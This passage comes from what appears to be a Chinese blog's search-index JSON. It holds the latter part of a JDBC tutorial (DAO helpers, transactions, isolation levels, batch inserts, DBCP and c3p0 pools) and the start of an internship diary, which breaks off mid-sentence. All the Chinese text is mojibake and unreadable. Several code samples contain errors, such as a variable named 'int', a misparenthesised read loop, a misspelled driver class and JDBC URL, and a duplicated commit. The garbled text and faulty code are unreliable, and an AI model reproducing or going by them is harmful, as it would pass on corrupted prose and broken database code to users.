list;\n}\n```\n\nå†™åˆ°è¿™é‡Œï¼Œä¸ºäº†ç»Ÿä¸€ï¼Œå¯ä»¥ç›´æ¥å°†è·å–å•ä¸ªå¯¹è±¡çš„æ–¹æ³•æ”¹ä¸ºå¦‚ä¸‹\n\n```Java\npublic <T> T get(Class<T> clazz, String sql, Object...args) {\n    List<T> list = getList(clazz, sql, args);\n    if (list.size() > 0) {\n        return list.get(0);\n    }\n    return null;\n}\n```\n\nä¸€æ ·çš„æ“ä½œï¼Œå†™ä¸€ä¸ªæ–¹æ³•æ¥è·å–æŸæ¡æ•°æ®çš„æŸä¸€ä¸ªå€¼ï¼ˆæŸ¥è¯¢ç»“æœåªæœ‰ä¸€è¡Œä¸€åˆ—ï¼‰\n\n```Java\npublic <E> E getValue(String sql, Object... args) {\n    Connection conn = null;\n    PreparedStatement ps = null;\n    ResultSet rs = null;\n    try {\n        conn = JDBCTools.getConnection();\n        ps = conn.prepareStatement(sql);\n        for (int i = 0; i < args.length; i++) {\n            ps.setObject(i + 1, args[i]);\n        }\n        rs = ps.executeQuery();\n        if (rs.next()) {\n            return (E) rs.getObject(1);\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n    } finally {\n        JDBCTools.release(rs, ps, conn);\n    }\n    return null;\n}\n```\n\nä¸Šé¢è¯´çš„è¿™äº›æ–¹æ³•å…±åŒç»„æˆäº†æ•°æ®è®¿é—®å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ DAO(Data Acess Object)ï¼Œåœ¨ DAO é‡Œï¼Œè¿˜å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€è¦æ·»åŠ å…¶ä»–çš„æ–¹æ³•ã€‚\n\n## JDBC å…ƒæ•°æ®\n\n- DatabaseMetaDataï¼ˆæè¿°æ•°æ®åº“çš„å…ƒæ•°æ®ï¼Œåšäº†è§£å°±è¡Œï¼Œä¸å¸¸ç”¨ï¼‰\n  - DatabaseMetaData dbmd = connection.getMetaData();\n  - ä»¥ä¸‹æ˜¯æ•°æ®åº“çš„åŸºæœ¬ä¿¡æ¯\n  - dbmd.getDatabaseMajorVersion(); // æ•°æ®åº“ç‰ˆæœ¬å·\n  - dbmd.getUsername(); // è¿æ¥åˆ°æ•°æ®åº“çš„ç”¨æˆ·å\n  - dbmd.getCatalogs(); // å¾—åˆ°æœ‰å“ªäº›æ•°æ®åº“,è¿”å›ä¸€ä¸ª ResultSet\n- ResultSetMetaData//æè¿°ç»“æœé›†çš„å…ƒæ•°æ®\n  - ResultSetMetaData rsmd = resultSet.getResultSetMetaData();\n  - rsmd.getColumnCount(); // åˆ—çš„ä¸ªæ•°\n  - rsmd.getColumnName(int i); // å¾—åˆ°ç¬¬ i åˆ—çš„åˆ—åï¼ˆi ä» 1 å¼€å§‹ï¼‰\n  - rsmd.getColumnLabel(int i); // å¾—åˆ°åˆ—çš„åˆ«å\n  - è¿˜æœ‰å…¶ä»–ä¸€äº›æ–¹æ³•å¯ä»¥è‡ªå·±æŸ¥é˜… API ä½¿ç”¨\n\n## è·å–æ•°æ®åº“è‡ªåŠ¨ç”Ÿæˆçš„ä¸»é”®å€¼\n\n```Java\n//ä»¥ PreparedStatement ä¸ºä¾‹ï¼Œåœ¨è·å–æ—¶\nPreparedStatement ps = connection.prepareStatement(sql, Statement.RETURN_GENERATED_KEYS);\n// ç„¶ååœ¨ sql è¯­å¥æ‰§è¡Œç»“æŸå  \nResultSet rs = ps.getGeneratedKeys(); // è·å–åˆ°çš„ç»“æœé›†åªæœ‰ä¸€åˆ— GENERATED_KEY\nif (rs.next()) {\n    String key = rs.getObject(1);\n}\n```\n\n## ä½¿ç”¨ jdbc å¤„ç† Blob\n\nTinyBlobï¼š255å­—èŠ‚  \nBlobï¼š65K  \nMediumBlobï¼š16M  \nLongBlobï¼š4G  \n\n1. ä½¿ç”¨ PreparedStatement æ’å…¥ Blob  \n   åœ¨è®¾ç½® ps å ä½ç¬¦çš„æ—¶å€™ï¼Œä½¿ç”¨ ps.setBlob(int position, InputStream stream) æ¥ä¼ å…¥ä¸€ä¸ªè¾“å…¥æµå³å¯\n2. ä½¿ç”¨ PreparedStatement è¾“å‡º Blob\n\n```Java\nBlob blob = resultSet.getBlob(int column);\nInputStream int = blob.getBinaryStream();\nOutputStream out = new FileOutputStream(\"xxx.xxx\");\n// è·å–åˆ°ç›¸åº”çš„è¾“å…¥æµåä½¿ç”¨ IO æ“ä½œå³å¯\nbyte[] buffer = new byte[1024];\nint len = 0;\nwhile(len = in.read(buffer) != -1) {\n    out.write(buffer, 0, len)\n}\nout.close();\nin.close();\n```\n\n## ä½¿ç”¨ JDBC å¤„ç†äº‹åŠ¡\n\näº‹åŠ¡çš„å››ä¸ª(ACID)å±æ€§ï¼šåŸå­æ€§ï¼Œ ä¸€è‡´æ€§ï¼Œ éš”ç¦»æ€§ï¼Œ æŒä¹…æ€§  \n\n1. äº‹åŠ¡ä¸­çš„æ¯ä¸ªæ“ä½œè¦ä½¿ç”¨ç›¸åŒçš„è¿æ¥\n2. ä½¿ç”¨æ­¥éª¤\n   - äº‹åŠ¡æ“ä½œå¼€å§‹å‰ï¼Œå…³é—­é»˜è®¤æäº¤\n   - å¦‚æœäº‹åŠ¡æ“ä½œéƒ½æˆåŠŸï¼Œåˆ™æäº¤äº‹åŠ¡\n   - è‹¥å‡ºç°å¼‚å¸¸ï¼Œåˆ™åœ¨ catch å—ä¸­å›æ»šäº‹åŠ¡\n\n```Java\ntry {\n    //å¼€å§‹äº‹åŠ¡\n    connection.setAutoCommit(false);//å–æ¶ˆé»˜è®¤æäº¤\n\n    // äº‹åŠ¡\n    // äº‹åŠ¡\n\n    connection.commit();\n    // äº‹åŠ¡å®Œæˆï¼Œæäº¤\n    connection.commit();\n} catch (Exception e) {\n    e.printStackTrace();\n    //å¦‚æœå‘ç”Ÿå¼‚å¸¸ï¼Œå›æ»šäº‹åŠ¡\n    try {\n        connection.rollback();\n    } catch (Exception e) {\n        e.printStackTrace();\n    } \n} finally {\n    // å›æ”¶æ•°æ®åº“èµ„æº\n}\n```\n\n## æ•°æ®åº“çš„éš”ç¦»çº§åˆ«\n\n- è„è¯»: å¯¹äºä¸¤ä¸ªäº‹ç‰© T1, T2, T1 è¯»å–äº†å·²ç»è¢« T2 æ›´æ–°ä½†è¿˜æ²¡æœ‰è¢«æäº¤çš„å­—æ®µ. ä¹‹å, è‹¥ T2 å›æ»š, T1è¯»å–çš„å†…å®¹å°±æ˜¯ä¸´æ—¶ä¸”æ— æ•ˆçš„.\n- ä¸å¯é‡å¤è¯»: å¯¹äºä¸¤ä¸ªäº‹ç‰© T1, T2, T1 è¯»å–äº†ä¸€ä¸ªå­—æ®µ, ç„¶å T2 æ›´æ–°äº†è¯¥å­—æ®µ. ä¹‹å, T1å†æ¬¡è¯»å–åŒä¸€ä¸ªå­—æ®µ, å€¼å°±ä¸åŒäº†.\n- å¹»è¯»: å¯¹äºä¸¤ä¸ªäº‹ç‰© T1, T2, T1 ä»ä¸€ä¸ªè¡¨ä¸­è¯»å–äº†ä¸€ä¸ªå­—æ®µ, ç„¶å T2 åœ¨è¯¥è¡¨ä¸­æ’å…¥äº†ä¸€äº›æ–°çš„è¡Œ. ä¹‹å, å¦‚æœ T1 å†æ¬¡è¯»å–åŒä¸€ä¸ªè¡¨, å°±ä¼šå¤šå‡ºå‡ è¡Œ.\n\n| éš”ç¦»çº§åˆ«                        | æè¿°                                                         |\n| ------------------------------- | ------------------------------------------------------------ |\n| READ UNCOMMITTED (è¯»æœªæäº¤æ•°æ®) | å…è®¸äº‹åŠ¡è¯»å–æœªè¢«å…¶ä»–äº‹åŠ¡æäº¤çš„å˜æ›´ã€è„è¯»ï¼Œä¸å¯é‡å¤è¯»å’Œå¹»è¯»çš„é—®é¢˜éƒ½ä¼šå‡ºç° |\n| READ COMMITTED (è¯»å·²æäº¤æ•°æ®)   | åªå…è®¸äº‹åŠ¡è¯»å–å·²ç»è¢«å…¶ä»–äº‹åŠ¡æäº¤çš„å˜æ›´ï¼Œå¯ä»¥é¿å…è„è¯»ï¼Œä½†ä¸å¯é‡å¤è¯»å’Œå¹»è¯»é—®é¢˜ä»ç„¶å¯èƒ½å‡ºç° |\n| REPEATABLE READ (å¯é‡å¤è¯»)      | ç¡®ä¿äº‹åŠ¡å¯ä»¥å¤šæ¬¡ä»ä¸€ä¸ªå­—æ®µä¸­è¯»å–ç›¸åŒçš„å€¼ã€‚åœ¨è¿™ä¸ªäº‹åŠ¡æŒç»­æœŸé—´ï¼Œç¦æ­¢å…¶ä»–äº‹åŠ¡å¯¹è¿™ä¸ªå­—æ®µè¿›è¡Œæ›´æ–°ã€‚å¯ä»¥é¿å…è„è¯»å’Œä¸å¯é‡å¤è¯»ï¼Œä½†å¹»è¯»çš„é—®é¢˜ä»ç„¶å­˜åœ¨ |\n| SERIABLIZABLE (ä¸²è¡ŒåŒ–)          | ç¡®ä¿äº‹åŠ¡å¯ä»¥ä»ä¸€ä¸ªè¡¨ä¸­è¯»å–ç›¸åŒçš„è¡Œã€‚åœ¨è¿™ä¸ªäº‹åŠ¡æŒç»­æœŸé—´ï¼Œç¦æ­¢å…¶ä»–äº‹åŠ¡å¯¹è¯¥è¡¨æ‰§è¡Œæ’å…¥ã€æ›´æ–°å’Œåˆ é™¤æ“ä½œã€‚æ‰€æœ‰å¹¶å‘é—®é¢˜éƒ½å¯ä»¥é¿å…ï¼Œä½†æ€§èƒ½ååˆ†ä½ä¸‹ |\n\næŸ¥çœ‹å½“å‰çš„éš”ç¦»çº§åˆ«: SELECT @@tx_isolation;  \n\n- è®¾ç½®å½“å‰ mySQL è¿æ¥çš„éš”ç¦»çº§åˆ«:  \n  set  transaction isolation level read committed;  \n- è®¾ç½®æ•°æ®åº“ç³»ç»Ÿçš„å…¨å±€çš„éš”ç¦»çº§åˆ«:  \n  set global transaction isolation level read committed;\n\nåœ¨ Java ä»£ç ä¸­è®¾ç½®éš”ç¦»çº§åˆ«\nconnection.setTransactionIsolation(Connection.TRANSACTION_READ_COMMITTED);  \nå¦‚æœç»å¸¸åˆ‡æ¢æ•°æ®åº“ï¼Œè€Œä¸”æ•°æ®åº“çš„éš”ç¦»çº§åˆ«ä½ç½®ï¼Œæœ€å¥½å¡«ä¸Šè¿™ä¸€è¡Œä»£ç ã€‚\n\n## æ‰¹é‡å¤„ç†æ•°æ®\n\nä¸€æ¬¡è¡Œå‘æ•°æ®åº“æ’å…¥ 100000 æ¡æ•°æ®\n\n```Java\nString sql = \"INSERT INTO test VALUES(?, ?)\";\npreparedStatement = connection.prepareStatement(sql);\n\nfor (int i = 0; i < 100000; i++) {\n    preparedStatement.setInt(1, i + 1);\n    preparedStatement.setString(2, \"name_\" + i);\n\n    //â€œç§¯æ”’â€ SQLè¯­å¥\n    preparedStatement.addBatch();\n    // æ¯â€œç§¯æ”’â€300æ¡å°±ç»Ÿä¸€æ‰§è¡Œä¸€æ¬¡ï¼Œå¹¶ä¸”æ¸…ç©ºå…ˆå‰â€œç§¯æ”’â€çš„SQL\n    if((i+ 1) % 300 == 0) {\n        preparedStatement.executeBatch();\n        preparedStatement.clearBatch();\n    }\n}\n// è‹¥æ€»æ¡æ•°ä¸æ˜¯æ‰¹é‡å€¼çš„æ•´æ•°å€ï¼Œåˆ™è¿˜éœ€è¦é¢å¤–å†æ‰§è¡Œä¸€æ¬¡\nif (100000 % 300 != 0) {\n    preparedStatement.executeBatch();\n    preparedStatement.clearBatch();\n}\n```\n\n## DBCPæ•°æ®åº“è¿æ¥æ± \n\nç¬¬ä¸€ç§åˆ›å»ºè¿æ¥æ± æ–¹æ³•\n\n```java\n// å¯¼å…¥DBCPå’ŒPoolåŒ…\nBasicDataSource dataSource = null;\n// åˆ›å»º DBCP æ•°æ®åº“å®ä¾‹\ndataSource = new BasicDataSource();\n\n// ä¸ºæ•°æ®åº“æºå®ä¾‹åˆ¶å®šå¿…é¡»çš„å±æ€§\ndataSource.setUsername(\"root\");\ndataSource.setPassword(\"*****\");//è¿™é‡Œå¯†ç æˆ‘å°±ä¸å†™å‡ºæ¥äº†\ndataSource.setUrl(\"jdbc:mysql://localhost:3306/school\");\ndataSource.setDriverClassName(\"com.kdbc.mysql.Driver\");\n\n// æŒ‡å®šæ•°æ®æºä¸€äº›å¯é€‰çš„å±æ€§\n// æŒ‡å®šæ•°æ®æºåˆå§‹åŒ–è¿æ¥æ•°çš„ä¸ªæ•°\ndatasource.setInitalSize(10);\n// æŒ‡å®šåŒä¸€æ—¶åˆ»æœ€å¤§çš„æ´»åŠ¨è¿æ¥æ•°\ndatasource.setMaxActive(50);\n// æŒ‡å®šæœ€å°è¿æ¥æ•°ï¼šåœ¨æ•°æ®åº“è¿æ¥æ± ä¸­èƒ½å¤Ÿä¿å­˜ä¸‹æ¥çš„æœ€å°è¿æ¥çš„æ•°é‡\ndatasource.setMinIdle(5);\n// ç­‰å¾…æ•°æ®åº“è¿æ¥æ± åˆ†é…è¿æ¥çš„æœ€å¤§ç­‰å¾…æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ï¼Œè¶…å‡ºåˆ™å¼‚å¸¸\ndatasource.setMaxWait(5000);\n\n// ä»æ•°æ®æºä¸­è·å–æ•°æ®åº“è¿æ¥\nConection connection = dataSource.getConnection();\n```\n\nç¬¬äºŒç§åˆ›å»ºè¿æ¥æ± æ–¹æ³•\n\n```Java\nProperties pp = new Properties();\nFileInputStream fis = new FileInputStream(\"dbcp.properties\");\npp.load(fis);\nfis.close();\nDataSource source = BasicDataSourceFactory.createDataSource(properties);\n```\n\nå±æ€§æ–‡ä»¶\n\n```\nproperties:\n# å¿…é¡»å±æ€§\nusername = root\npassword = *****;\ndriverClassName = com.mysql.jdbc.Driver\nurl = jdbc:mysql://localhost:3306/school\n\n# å¯é€‰å±æ€§\ninitialSize = 10\nmaxActive = 50\nminIdle = 5\nmaxWait = 5000\n```\n\n## c3p0 æ•°æ®åº“è¿æ¥æ± \n\n[C3P0å®˜ç½‘](http://www.mchange.com/projects/c3p0/)\nç¬¬ä¸€ç§æ–¹æ³•\n\n```Java\n// æ·»åŠ  jar åŒ…\nComboPooledDataSource cpds = new ComboPooledDataSource();\ncpds.setDriverClass(\"com.mysql.jdbc.Driver\");\ncpds.setJdbcUrl(\"jdbs:mysql://localhost:3306/school\");\ncpds.setUser(\"root\");\ncpds.setPassword(\"*****\");\n\n```\n\nç¬¬äºŒç§æ–¹æ–¹æ³•\nåˆ›å»º c3p0-config.xml é…ç½®æ–‡ä»¶\n\n```xml\n<c3p0-config>\n\n  <named-config name=\"helloc3p0\"> \n    <!-- æŒ‡å®šè¿æ¥æ•°æ®æºçš„åŸºæœ¬å±æ€§ -->\n\t\t<property name=\"user\">root</property>\n\t\t<property name=\"password\">1230</property>\n\t\t<property name=\"driverClass\">com.mysql.jdbc.Driver</property>\n\t\t<property name=\"jdbcUrl\">jdbc:mysql:///atguigu</property>\n\t\t\n\t\t<!-- è‹¥æ•°æ®åº“ä¸­è¿æ¥æ•°ä¸è¶³æ—¶, ä¸€æ¬¡å‘æ•°æ®åº“æœåŠ¡å™¨ç”³è¯·å¤šå°‘ä¸ªè¿æ¥ -->\n\t\t<property name=\"acquireIncrement\">5</property>\n\t\t<!-- åˆå§‹åŒ–æ•°æ®åº“è¿æ¥æ± æ—¶è¿æ¥çš„æ•°é‡ -->\n\t\t<property name=\"initialPoolSize\">5</property>\n\t\t<!-- æ•°æ®åº“è¿æ¥æ± ä¸­çš„æœ€å°çš„æ•°æ®åº“è¿æ¥æ•° -->\n\t\t<property name=\"minPoolSize\">5</property>\n\t\t<!-- æ•°æ®åº“è¿æ¥æ± ä¸­çš„æœ€å¤§çš„æ•°æ®åº“è¿æ¥æ•° -->\n\t\t<property name=\"maxPoolSize\">10</property>\n\n\t\t<!-- C3P0 æ•°æ®åº“è¿æ¥æ± å¯ä»¥ç»´æŠ¤çš„ Statement çš„ä¸ªæ•° -->\n\t\t<property name=\"maxStatements\">20</property>\n\t\t<!-- æ¯ä¸ªè¿æ¥åŒæ—¶å¯ä»¥ä½¿ç”¨çš„ Statement å¯¹è±¡çš„ä¸ªæ•° -->\n\t\t<property name=\"maxStatementsPerConnection\">5</property>\n\n  </named-config>\n</c3p0-config>\n```\n\nä½¿ç”¨ä»¥ä¸Š xml æ–‡ä»¶å»ºç«‹æ•°æ®åº“è¿æ¥æ± \n\n```Java\nDataSource source = new ComboPooledDataSource(\"helloc3p0\");\nComboPooledDataSource cpds = (ComboPooledDataSource) source;\n```\n\næ•°æ®åº“è¿æ¥æ± ä¸­çš„ Connection å…³é—­æ—¶ä¸æ—¶çœŸçš„è¿›è¡Œå…³é—­ï¼Œè€Œæ˜¯å°†è¯¥æ•°æ®åº“è¿æ¥å½’è¿˜åˆ°æ•°æ®åº“è¿æ¥æ± ä¸­ã€‚\n\n## ä½¿ç”¨ DBUtils\n\nç›´æ¥çœ‹ [æºç ](/assets/jdbc/TestDBUtils.java) å§ï¼Œå†™å¾—å¾ˆè¯¦ç»†äº†\n\n## ç›¸å…³æºç \n\næœ¬ç‰‡æ–‡ç« çš„ç›¸å…³ä»£ç æˆ‘å·²ç»ä¸Šä¼ åˆ° github ä¸Šäº†ï¼Œåœ¨ [è¿™ä¸ªæ–‡ä»¶å¤¹](/assets/jdbc) é‡Œï¼Œ`.java`åç¼€çš„æ–‡ä»¶éƒ½æ˜¯ï¼Œä»£ç å’Œæ³¨é‡Šéƒ½å†™å¾—æŒºè¯¦ç»†ï¼Œæœ‰é—®é¢˜å¯ä»¥å‘æˆ‘é‚®ç®±ä¸€èµ·è®¨è®ºã€‚","tags":["Java","JDBC"]},{"title":"æš‘æœŸå®è®­æ—¥å¿—","url":"/2017/07/25/summer-intership-diary/","content":"\n\n## å‰è¨€\n\nè¿™é‡Œæ˜¯åœ¨æš‘æœŸå®è®­è¿‡ç¨‹ä¸­æˆ‘è‡ªä¸»å†™çš„æ—¥å¿—ï¼ˆå…¶å®å°±æ˜¯æ¯å¤©çš„æµæ°´è´¦ï¼‰ï¼Œæˆ‘å°†å®ƒè®°ä¸‹æ¥å› ä¸ºè¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡â€œå®ä¹ â€ï¼Œå®ä¹ è¿‡ç¨‹ä¸­å­¦ä¹ å’Œå¿ƒæ€å†ç¨‹éƒ½å‘ç”Ÿäº†å˜åŒ–ï¼Œæ•´ä¸ªé¡¹ç›®åˆ°æœ€ååº”è¯¥ä¸èƒ½ç®—æ˜¯ä»¤äººæ»¡æ„çš„ï¼Œå¸Œæœ›ä¸‹æ¬¡åšå¯ä»¥å€Ÿé‰´è¿™æ¬¡çš„ç»å†å’Œæ•™è®­ã€‚\n\n## æ­£æ–‡\n\n### ç¬¬ä¸€å¤©(7/10)\n\nä»Šå¤©å®Œå…¨åœ¨æ‰“é…±æ²¹ï¼Œä¸Šåˆå’Œåˆ†å°ç»„å†åŠ é€‰é¢˜ç›®ï¼Œç„¶åå¸ƒç½®ä»»åŠ¡å†™å¼€é¢˜æŠ¥å‘Šã€‚  \nä¸‹åˆå°±åœ¨å†™å¼€é¢˜æŠ¥å‘Šï¼Œå†™å†™ç©ç©çš„ï¼Œä¸­é—´å»å½•äº†æŒ‡çº¹ï¼Œå¦å¤– #204 çš„ç½‘çœŸçš„å¤ªå·®äº†ï¼Œæƒ³å¿µ #507 10M/sçš„å®½å¸¦ã€‚  \nä¸‹åˆæˆ‘ä»¬ç»„å‘˜ä¸€èµ·èŠå¤©å¼€ç©ç¬‘ï¼Œå‡ºäº†ä¸€ç‚¹æ„å¤–å‘ç”Ÿäº†ä¸æ„‰å¿«çš„äº‹æƒ…ï¼Œä¸å†™åœ¨è¿™é‡Œäº†ã€‚\n\n### ç¬¬äºŒå¤©(7/11)\n\nä¸Šåˆç½‘ç»œç˜«ç—ªï¼Œyyç»ç†å¸ƒç½®å†™é¡¹ç›®ç‡ƒå°½å›¾ï¼Œä¸‹åˆäº¤ã€‚  \nä¸‹åˆyyç»ç†æ‰¾æˆ‘ä»¬è°ˆè¯ï¼ŒçŸ¥é“æˆ‘åå­—ä¹‹åè¯´ä»–å‰é¢å¸¦è¿‡ä¸¤ä¸ªå«æè¾‰çš„å­¦ç”Ÿï¼Œç¬¬ä¸€ä¸ªæ˜¯åç§‘å¤§ç¥ï¼Œå¤§å­¦å››å¹´æ¥é¡¹ç›®åšæ¥äº†50ä¸‡ï¼›ç¬¬äºŒä¸ªæ˜¯å›½é˜²ç”Ÿï¼Œå­¦ä¹ ä¹Ÿåˆ»è‹¦ï¼Œä¹‹å‰ç”³è¯·ä¿ç ”ã€‚åæ¥ä»–é—®äº†é—®æˆ‘ä»¬çš„ç¼–ç¨‹æ°´å¹³ï¼Œæˆ‘ä»¬éƒ½è¯´æ¯”è¾ƒæ°´ï¼Œè€Œä¸”ä¸€ä¸ªæ¯”ä¸€ä¸ªæ°´ã€‚ã€‚ã€‚ä»–è¯´æˆ‘ä»¬å¤ªè°¦è™šäº†ï¼Œè€Œå®é™…ä¸Šæˆ‘ä»¬ä¹Ÿåªæœ‰è¿™ä¸ªæ°´å¹³ï¼Œä¸æ•¢è‡ªå¤¸ã€‚\nä¸­åˆæˆ‘å‘è€å¸ˆç”³è¯·å»åšé¡¹ç›®æˆ‘ä»¬ç­è‡ªå·±çš„æœºæˆ¿ #507 åšï¼Œ #204 ç½‘ç»œç¯å¢ƒå®åœ¨å¤ªå·®äº†ï¼Œé¢‘ç¹æ–­ç½‘ï¼Œ100 æ¥ä¸ªåŒå­¦æŒ¤åœ¨ä¸€é—´æ•™å®¤ï¼Œç©ºè°ƒä»Šå¤©ä¸‹åˆåˆåäº†ã€‚ç»“æœæ˜¯ä¸åŒæ„ï¼Œè¦æœä»å­¦æ ¡è§„å®šã€‚\n\n### ç¬¬ä¸‰å¤©(7/12)\n\nåŸºæœ¬åœ¨çœ‹ä¹¦å’Œå­¦ä¹ è§†é¢‘ - æœ‰å…³å®‰å“å¤šçº¿ç¨‹ç¼–ç¨‹å’Œä½¿ç”¨æœåŠ¡ã€‚  \nä¸ŠåˆæŠŠè‡ªå·±å®‰åœ¨ #507 çš„è·¯ç”±å™¨æ‹†äº†ä¸‹æ¥ï¼Œå®‰è£…åœ¨äº† #204ï¼Œç”¨ l2tp è¿ä¸Šæ ¡å›­ç½‘æ‰è§£å†³äº†ç½‘ç»œé—®é¢˜ï¼Œä¸ç„¶æ²¡æœ‰ç½‘ç»œæ„Ÿè§‰æ˜¯åœ¨é—­é—¨é€ è½¦ã€‚ç½‘ç»œæ­å¥½å°±æŠŠç»ç†ä¸Šä¼ åœ¨ç¾¤é‡Œçš„å­¦ä¹ è§†é¢‘ä¸‹æ¥çœ‹ï¼ŒåŸæ¥ç”¨#204çš„ç½‘ 100b/séƒ½ä¸åˆ°ï¼Œåˆ«è¯´ä¸‹è§†é¢‘ï¼ŒQQ éƒ½ç™»ä¸ä¸Šã€‚ã€‚ã€‚  \nä¸‹åˆå°±æ˜¯æ¥ç€ä¸Šåˆç»§ç»­å­¦ä¹ ï¼Œä¸­é—´åœ¨ç½‘ä¸Š csdn å’Œ github ä¸Šæ‰¾äº†ä¸€äº› demo çœ‹ã€‚  \nå’Œç»„å‘˜zzhçš„ä¸€ç‚¹å°çŸ›ç›¾ä»Šå¤©åº”è¯¥æ˜¯æ²¡äº‹äº†ï¼Œä¸æƒ³å†è®²è¿™ä»¶äº‹äº†ï¼ŒçœŸçš„ä¸æƒ³ã€‚\n\n### ç¬¬å››å¤©(7/13)\n\nä»¿ç…§ç€å‰ä¸€å¤©ä¸‹è½½çš„ demoï¼Œå¼€å§‹å®ç°åŠŸèƒ½ï¼Œä¸­é—´é˜…è¯»ä½œè€…æºç æœ‰åœ°æ–¹ä¸æ‡‚å¾®ä¿¡è¿˜è”ç³»äº†ä»–(Dylan)ï¼Œä»–æœ¬äººä¹Ÿæ˜¯å¾ˆçƒ­æƒ…åœ°è§£å†³äº†æˆ‘çš„ç–‘æƒ‘ã€‚ä¸è¿‡ä»–çš„ demo å‡ºäº†ä¸ª bug ï¼Œå’Œä»–åæ˜ äº†ã€‚ä»–ç¼ºå°‘è¿™ä¸ªå‹å·çš„æœºå­æ²¡åŠæ³•æµ‹è¯•ï¼Œä»–è¯´å…¶ä»–çš„å‹å·ç›®å‰æ²¡é—®é¢˜ã€‚  \n\n![åæ˜  bug](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200627163714.jpg)\n\nä¸‹åˆåˆé—®äº†ä»–ä¸€äº›é—®é¢˜ï¼ŒåŸºæœ¬æŠŠä»–çš„demoçœ‹æ‡‚äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è‡ªå·±åŠ¨æ‰‹æŠ„åˆ€äº†ã€‚ä¸­é€”çœ‹ä»£ç çš„æ—¶å€™é¡¹ç›®è´Ÿè´£äººspè¿‡æ¥æ‰¾æˆ‘å°¬èŠï¼Œäº†è§£äº†æˆ‘å‡ºå›½çš„æ„å‘ï¼Œå’Œæˆ‘è¯´å›½å¤–å…¶å®å¹¶ä¸å¥½ä»€ä¹ˆçš„ï¼Œæ¨èæˆ‘å­¦ä¹ å®Œåå›å›½å·¥ä½œï¼Œè¿˜æäº†æœ€è¿‘å›½å¤–å¤§å­¦ç”Ÿå¤±è¸ªçš„äº‹æƒ…ã€‚è¿™äº›äº‹æƒ…æˆ‘è¿˜è¯´ä¸å‡†ï¼Œæš‚æ—¶æ”¶ä¸‹å¥¹çš„å»ºè®®å§ï¼Œèµ°åˆ°é‚£ä¸€æ­¥æ‰çŸ¥é“åé¢æ€ä¹ˆèµ°ã€‚  \næœ€åä¸‹åˆæ”¶å·¥å‰ä¸€ä¸ªå°æ—¶è¿˜æ˜¯å®ç°äº†åŠŸèƒ½ï¼Œå¾ˆé«˜å…´ã€‚åªæ˜¯æ›´æ–°æ­¥æ•°çš„æ—¶å€™æ˜¯è®¡æ—¶è°ƒå–æ•°æ®çš„ã€‚\n\n### ç¬¬äº”å¤©(7/14)\n\nä»Šå¤©æœ¬æ¥æƒ³ç»™æ›´æ–°æ­¥æ•°åŠ ä¸ªæ¥å£å†™æˆå›è°ƒï¼Œå¦å¤–å†æŠŠè®¡æ­¥æ”¾å…¥ servie å†™æˆåå°ï¼Œç¬¬ä¸€ä¸ªå®ç°äº†ï¼Œç¬¬äºŒä¸ªæœ¬æ¥åº”è¯¥ä¸Šåˆ10ç‚¹å·¦å³å°±å†™å¥½çš„ï¼Œç»“æœå› ä¸ºä¸€ä¸ªæ„šè ¢çš„è‡´å‘½æ€§çš„é”™è¯¯ï¼ŒæŸ¥äº†ä¸€å¤© - serviceæ²¡æœ‰åœ¨ AndroidManifest.xml æ³¨å†Œï¼ŒçœŸçš„æ˜¯è ¢å¾—æ­»ã€‚ã€‚ã€‚  \nä¸‹åˆåæ¥å’Œä¸€ä¸ªç»„å‘˜tlè®¨è®ºäº†ä¸€ä¸‹æ˜¯å®ç°ä¸€ä¸ªè‡ªå®šä¹‰ viewï¼Œå’Œå¦å¤–ä¸€ä¸ªç»„å‘˜zffè®¨è®ºæ˜å¤©å¼€å§‹å†™åå°æ•°æ®åº“ã€‚  \nè¿™ä¸¤å¤©æ‰‹æŒ‡æœ‰ç‚¹èœ•çš®ï¼ŒæŒ‡çº¹ç­¾åˆ°æœ‰ç‚¹ä¸çµæ•ï¼Œè¦æŒ‰å¥½å‡ ä¸‹æ‰èƒ½è¯†åˆ«å‡ºæ¥ã€‚  \næ˜¨å¤©ç»™ç»„å‘˜ä»¬æ¯ä¸ªäººä¹°äº†ä¸€æ¯è¥¿ç“œæ±ï¼Œä»Šå¤©å…¶ä¸­ä¸€ä¸ªç»„å‘˜zffå°±å»ç»™æ¯ä¸ªäººä¹°äº†ä¸€æ¯å¥¶èŒ¶ï¼Œæ²¡æœ‰æƒ³åˆ°å®åœ¨æ˜¯å¤ªå®¢æ°”äº†ã€‚  \næœ€è¿‘9æ ‹åœ¨è£…ä¿®ï¼Œæ¥¼é“å¾ˆåµï¼Œæ—¶ä¸æ—¶æ¡Œå­è¿˜æ‘‡æ™ƒï¼Œä½“éªŒå¾ˆå·®ï¼Œæ²¡åŠæ³•ä¹ æƒ¯å°±å¥½ã€‚\n\n### ç¬¬å…­å¤©(7/15)\n\nä»Šå¤©æ²¡æœ‰æ€ä¹ˆåšå…·ä½“çš„ä»£ç å®ç°å·¥ä½œ  \nä¸Šåˆå» #204 ä¸çŸ¥é“å¹²äº†ä»€ä¹ˆå°±10ç‚¹åŠäº†ï¼Œå‰©ä¸‹ä¸€ä¸ªå°æ—¶å’Œç»„å‘˜è®¨è®ºäº†ä¸€ä¸‹æ¥ä¸‹æ¥çš„åˆ†å·¥ã€‚  \nä¸‹åˆå’Œç»„å‘˜zzfåœ¨è®¨è®ºæ·»åŠ å¥½å‹åŠŸèƒ½çš„å®ç°é—®é¢˜ï¼ŒèŠèŠç©ç©çš„ï¼Œä¸€å¤©å°±è¿‡å»å•¦ã€‚\n\n### ç¬¬ä¸ƒå¤©(7/16)\n\nä¸Šåˆç”¨ ViewPager å’Œ BottomNavigationView å†™å‡ºä»¿å¾®ä¿¡ä½æ   \nä¸‹åˆå’Œç»„å‘˜lmjè®¨è®ºè‡ªå®šä¹‰å¦å¤–ä¸€ä¸ª view çš„äº‹æƒ…ç„¶åå‡ºå»ä¹°é¥®æ–™ï¼Œå›æ¥ç»„å‘˜zzfå·²ç»æˆåŠŸå®ç°å¥½å‹æ·»åŠ åŠŸèƒ½ï¼Œç„¶åæ‰“ç®—å’Œä»–ä¸€èµ·ä½¿ç”¨gitå®Œæˆé¡¹ç›®ï¼Œç»“æœè‡ªå·±å¯¹ git 